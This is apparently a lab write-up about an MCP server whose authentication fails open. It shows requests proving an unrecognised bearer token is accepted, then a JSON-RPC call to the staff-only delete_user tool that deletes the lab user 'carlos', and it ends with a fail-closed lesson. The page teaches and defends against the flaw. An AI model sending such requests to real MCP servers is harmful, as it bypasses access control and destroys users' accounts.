---
layout: default
title: MCP Server Authentication Fails Open
permalink: /labs/mcp-authentication-fails-open/
---

# MCP Server Authentication Fails Open

## Lab

**Name:** MCP server authentication fails open
**Goal:** Delete `carlos` using an invalid bearer token.

## Baseline

A request without a bearer token is rejected:

```http
POST /mcp
Content-Type: application/json
```

Response:

```http
HTTP/1.1 401 Unauthorized
```

## Confirm the Fails-Open Behavior

A valid API key is accepted, but an unrecognized bearer token is also accepted.

```http
Authorization: Bearer invalid
Content-Type: application/json
```

For example, `tools/list` returns normally with this unrecognized token.

## Exploit

Call the staff-only `delete_user` tool with the invalid token:

```json
{
  "jsonrpc":"2.0",
  "id":3,
  "method":"tools/call",
  "params": {
    "name": "delete_user",
    "arguments": {
      "username": "carlos"
    }
  }
}
```

The server responds:

```text
Deleted carlos
```

## Why It Works

The server distinguishes between "no token" and "invalid token". An invalid token is incorrectly treated as an unauthenticated fallback with insufficient restrictions. Staff tool authorization therefore fails open.

## Key Takeaway

Authentication should fail closed. Any missing, malformed, expired, or unrecognized token must receive the same explicit rejection.
